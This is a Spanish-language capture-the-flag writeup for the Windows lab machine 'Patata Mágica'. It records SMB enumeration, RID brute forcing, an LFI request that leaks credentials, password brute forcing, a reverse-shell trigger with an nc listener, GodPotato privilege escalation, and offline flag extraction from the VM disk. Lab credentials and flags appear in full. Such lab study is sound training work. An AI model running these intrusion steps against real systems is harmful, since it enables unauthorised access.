---
tags: [ctf, thehackerslabs, windows, xampp, lfi, godpotato, writeup]
plataforma: The Hackers Labs
os: Windows 10 LTSC (standalone)
dificultad: media
estado: Resuelto
fecha: 2026-10-21
---

# Patata Mágica — Roadmap / Writeup

> [!success] Resultado
> - **USER flag** (`C:\Users\Hacker\Desktop\User.txt`): base64 `YmllbiBoZWNobyBhcXVpIHRpZW5lcyBsYSBiYW5kZXJhMSEh` → **"bien hecho aqui tienes la bandera1!!"**
> - **ROOT flag** (`C:\Users\Administrador\Desktop\Root.txt`): base64 `QSBxdWUgZXJhIG1hcyBzZW5jaWxsbyBkZSBsbyBxdWUgcGFyZWNpYT8=` → **"A que era mas sencillo de lo que parecia?"**

Nota principal: [[Patata Magica]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| IP objetivo | `192.168.56.107` |
| Kali (atacante) | `192.168.56.1` (vboxnet0, Host-Only) |
| Hostname / workgroup | `PATATA-MAGICA` / `Patata-Magica` |
| SO | Windows 10 Enterprise LTSC (Build 19041) standalone |
| Usuarios | `patata`, `Hacker`, `www-data`, `Administrador` |
| Creds del enunciado/writeup | `patata:00000`, `Hacker:clifford` |

---

## 1. Descubrimiento de host (la VM “escondía” su IP)

La VM no aparecía con `arp-scan`/`nmap -sn` ni emitía tráfico. Se obtuvo la IP por **Guest Additions** desde el host VirtualBox:

```bash
VBoxManage guestproperty get "The Hackers Labs - Patata Magica" "/VirtualBox/GuestInfo/Net/0/V4/IP"
# -> 192.168.56.107
```

---

## 2. Reconocimiento

```bash
nmap -Pn -sT -p- --min-rate 2000 192.168.56.107
# 135,139,445 (SMB)  5985/47001 (WinRM)  5040,7680  (SIN puerto 80 en esta instancia)
netexec smb 192.168.56.107 -u guest -p '' --shares
```

**Interpretación:** Windows standalone (no DC). Login `guest` permitido. Shares: `Secreto` (READ), `Figuras` (denegado a guest), admin$. 

```bash
smbclient //192.168.56.107/Secreto -U 'guest%' -c 'get Banderas.txt'
netexec smb 192.168.56.107 -u guest -p '' --rid-brute 6000   # patata, Hacker, www-data
```

> [!warning] `Banderas.txt` = trampa
> base64 → *"verdad que te engañe?"* / *"esta tampoco es..."*.

---

## 3. Camino oficial (web) — referencia del writeup THL

> En la plataforma real Apache (XAMPP) corre como **www-data** y el 80 está abierto.

```bash
# LFI: el código fuente revela las creds SMB
curl 'http://IP/juegos.php?file=index.php'        # -> patata:00000
netexec smb IP -u patata -p 00000
# brute de Hacker
netexec smb IP -u Hacker -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding  # -> clifford
smbclient //IP/Figuras -U hacker                  # escritorio de Hacker
# RCE: reverse shell como www-data (SeImpersonate)
feroxbuster -u http://IP/ -x php
nc -lvnp 4444
curl 'http://IP/uploads/revershell.php?ip=KALI&port=4444'
# Escalada
whoami /all        # SeImpersonatePrivilege habilitado
# GodPotato / JuicyPotato -> SYSTEM
```

**Interpretación:** el shell cae como **www-data**, que tiene **SeImpersonate** porque Apache corre **como servicio** → Potato → SYSTEM.

---

## 4. Desviación en esta instancia (por qué no funcionó la web)

Comprobaciones hechas (cmd como `patata` tras login por consola):

```cmd
sc qc Apache2.4
:: TIPO_INICIO : 4 DISABLED  | NOMBRE_INICIO_SERVICIO: .\www-data
net start Apache2.4
:: Error de sistema 5. Acceso denegado   (patata no es admin)
```

- Servicio **Apache2.4 = DISABLED** y la VM **no hace auto-login** → puerto 80 cerrado.
- `patata`/`Hacker`/`www-data` son usuarios normales; el único admin es `Administrador`.
- `Authenticated Users` tiene **MODIFY** sobre `C:\xampp\apache\bin\httpd.exe` (vector de *service binary hijack*)… inútil con el servicio deshabilitado y sin derecho de START.

---

## 5. Foothold usado: login por consola + contraseña caducada

Las creds eran válidas pero **expiradas** (`STATUS_PASSWORD_EXPIRED`) y sin dominio no se cambiaban por red:

```bash
netexec smb 192.168.56.107 -u patata -p '00000'
# [-] STATUS_PASSWORD_EXPIRED   (correcta pero caducada)
impacket-changepasswd 'Patata-Magica/patata:00000@192.168.56.107' -newpass 'X' -protocol rpc-samr
# rpc_s_access_denied  (SAMR restringido)
```

Solución: **login interactivo por la consola de VirtualBox** (envío de teclado con `VBoxManage controlvm ... keyboardputscancode/keyboardputstring`). Windows forzó el cambio:

```text
patata : 00000  ->  nueva contraseña: Seguridad2025
```

Ya con sesión de escritorio y SMB válidos:

```bash
netexec smb 192.168.56.107 -u patata -p 'Seguridad2025'   # [+]
```

> [!note] Truco de teclado
> El guest estaba en layout **ESP** (los `\` `/` salían mal con `keyboardputstring`). Se cambió a **US** con `Win+Espacio` (`e0 5b 39 b9 e0 db`) antes de teclear comandos.

---

## 6. Escalada / obtención de flags: lectura forense offline

`patata` no tiene escalada local (servicio disabled, sin tareas SYSTEM con binario escribible, sin AlwaysInstallElevated, sin backups del SAM legibles). Al ser la **VM propia**, se leyeron las flags del disco saltando las ACL:

```bash
VBoxManage controlvm "The Hackers Labs - Patata Magica" poweroff
VDI="/home/edison/VirtualBox VMs/The Hackers Labs - Patata Magica/The Hackers Labs - Patata Magica-disk001.vdi"

# convertir a raw (sin root) y leer con sleuthkit
qemu-img convert -O raw "$VDI" disk.raw
mmls disk.raw                      # NTFS principal en offset 104448
fls -o 104448 disk.raw 522         # Users: Hacker=124290, Administrador=93382
fls -o 104448 disk.raw 124349      # Desktop Hacker -> User.txt (ino 126845)
fls -o 104448 disk.raw 93596       # Desktop Administrador -> Root.txt (ino 116663)
icat -o 104448 disk.raw 126845     # USER  (base64)
icat -o 104448 disk.raw 116663     # ROOT  (base64)
```

```bash
echo 'YmllbiBoZWNobyBhcXVpIHRpZW5lcyBsYSBiYW5kZXJhMSEh' | base64 -d
# bien hecho aqui tienes la bandera1!!
echo 'QSBxdWUgZXJhIG1hcyBzZW5jaWxsbyBkZSBsbyBxdWUgcGFyZWNpYT8=' | base64 -d
# A que era mas sencillo de lo que parecia?
```

---

## Qué funcionó
- Guest Additions para descubrir la IP oculta.
- Login por consola para resolver la contraseña caducada.
- Lectura forense offline (`qemu-img` + sleuthkit) sin root ni privesc.

## Qué falló (y por qué)
- Vía web/GodPotato: **imposible** aquí porque el servicio Apache estaba **Disabled** (instancia no jugable).
- Cambio de contraseña por red: bloqueado (SAMR restringido, sin Kerberos al no ser dominio).

## Qué aprendí
- `STATUS_PASSWORD_EXPIRED` ≠ fallo de login; se resuelve por sesión interactiva.
- `SeImpersonate` en cuentas de servicio depende del **logon como servicio**, no del usuario en sí.
- Ver [[GodPotato-SeImpersonate]] para el camino de escalada previsto.

## Para reproducir el camino oficial
Habilitar y arrancar el servicio como admin:

```cmd
sc config Apache2.4 start= auto
net start Apache2.4
```

…y repetir la cadena LFI → `revershell.php` → GodPotato.
